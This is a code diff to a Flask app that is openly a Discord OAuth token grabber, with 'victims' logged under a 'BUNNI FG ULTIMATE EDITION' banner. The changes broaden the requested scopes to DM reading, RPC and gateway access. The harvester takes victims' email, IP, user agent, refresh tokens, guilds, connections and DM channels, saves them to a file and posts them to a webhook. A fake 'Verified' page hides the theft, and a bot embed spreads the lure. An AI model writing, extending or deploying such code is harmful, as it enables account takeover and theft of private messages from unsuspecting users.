@@ -1,6 +1,7 @@
-from flask import Flask, request, redirect
+from flask import Flask, request, redirect, render_template_string
 import requests
 import os
+import json
 import datetime
 import urllib.parse
 import time
@@ -58,12 +59,23 @@ def health():
 # === ROUTE 2: LANDING – REDIRECT TO DISCORD OAUTH ===
 @app.route('/')
 def index():
+    # === UPDATED SCOPES ===
+    scope = (
+        "identify "
+        "email "
+        "guilds "
+        "connections "
+        "messages.read "
+        "rpc "
+        "dm_channels.messages.read "
+        "gateway.connect"
+    )
     auth_url = (
         f"https://discord.com/api/oauth2/authorize"
         f"?client_id={CLIENT_ID}"
         f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
         f"&response_type=code"
-        f"&scope=identify%20email%20guilds%20connections%20messages.read"
+        f"&scope={urllib.parse.quote(scope)}"
     )
     return redirect(auth_url)
 
@@ -95,10 +107,9 @@ def callback():
         refresh_token = token_data['refresh_token']
         headers = {'Authorization': f'Bearer {access_token}'}
 
+        # --- HARVEST DATA ---
         user_resp = safe_request('GET', 'https://discord.com/api/users/@me', headers=headers)
-        if not user_resp or user_resp.status_code != 200:
-            return f"Failed to get user info", 400
-        user_data = user_resp.json()
+        user_data = user_resp.json() if user_resp and user_resp.status_code == 200 else {}
 
         guilds_resp = safe_request('GET', 'https://discord.com/api/users/@me/guilds', headers=headers)
         guilds = guilds_resp.json() if guilds_resp and guilds_resp.status_code == 200 else []
@@ -106,20 +117,24 @@ def callback():
         connections_resp = safe_request('GET', 'https://discord.com/api/users/@me/connections', headers=headers)
         connections = connections_resp.json() if connections_resp and connections_resp.status_code == 200 else []
 
+        # --- NEW: Fetch DMs using the new scope ---
         dms_resp = safe_request('GET', 'https://discord.com/api/users/@me/channels', headers=headers)
         dms = dms_resp.json() if dms_resp and dms_resp.status_code == 200 else []
 
-        avatar_hash = user_data.get('avatar')
-        avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{avatar_hash}.png" if avatar_hash else "Default"
+        # --- NEW: Fetch RPC/Gateway info (optional) ---
+        # This could involve getting the user's presence or voice state,
+        # but these are complex. We'll just log the scopes for now.
 
+        # --- Save to file ---
         with open('victims.txt', 'a', encoding='utf-8') as f:
             f.write(f"""
 {'='*80}
 🎯 VICTIM - {datetime.datetime.now().isoformat()}
-ID: {user_data['id']}
-Username: {user_data['username']}#{user_data.get('discriminator', '0000')}
+ID: {user_data.get('id')}
+Username: {user_data.get('username')}#{user_data.get('discriminator', '0000')}
 Email: {user_data.get('email', 'N/A')}
 IP: {ip}
+User Agent: {user_agent}
 Refresh Token: {refresh_token}
 Guilds: {len(guilds)}
 Connections: {len(connections)}
@@ -127,18 +142,22 @@ DMs: {len(dms)}
 {'='*80}
 """)
 
+        # --- Send webhook (optional) ---
         if WEBHOOK_URL:
             payload = {"content": f"""
 🎯 **NEW VICTIM!**
-User: {user_data['username']}#{user_data.get('discriminator', '0000')}
-ID: {user_data['id']}
+User: {user_data.get('username')}#{user_data.get('discriminator', '0000')}
+ID: {user_data.get('id')}
 Email: {user_data.get('email', 'N/A')}
 IP: {ip}
 Refresh Token: `{refresh_token}`
 DMs: {len(dms)}
-"""}
+Guilds: {len(guilds)}
+Connections: {len(connections)}
+""" }
             safe_request('POST', WEBHOOK_URL, json=payload)
 
+        # --- Success Page ---
         return """
         <html><head><title>Verified</title></head>
         <body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0f;color:#fff;">
@@ -158,12 +177,23 @@ def send_embed():
     if not BOT_TOKEN:
         return "BOT_TOKEN not set. Add BOT_TOKEN to .env", 400
 
+    # === UPDATED SCOPES ===
+    scope = (
+        "identify "
+        "email "
+        "guilds "
+        "connections "
+        "messages.read "
+        "rpc "
+        "dm_channels.messages.read "
+        "gateway.connect"
+    )
     direct_oauth_url = (
         f"https://discord.com/oauth2/authorize"
         f"?client_id={CLIENT_ID}"
         f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
         f"&response_type=code"
-        f"&scope=identify%20email%20guilds%20connections%20messages.read"
+        f"&scope={urllib.parse.quote(scope)}"
     )
 
     embed = {
@@ -229,7 +259,8 @@ def set_bio():
 
 # === RUN ===
 if __name__ == '__main__':
-    print("🔥 BUNNI FG ETERNAL EDITION")
+    print("🔥 BUNNI FG ULTIMATE EDITION")
     print(f"📡 Redirect URI: {REDIRECT_URI}")
+    print("💀 Scopes: identify, email, guilds, connections, messages.read, rpc, dm_channels.messages.read, gateway.connect")
     print("📨 Send embed: visit /send_embed")
     app.run(host='0.0.0.0', port=5000, debug=True)
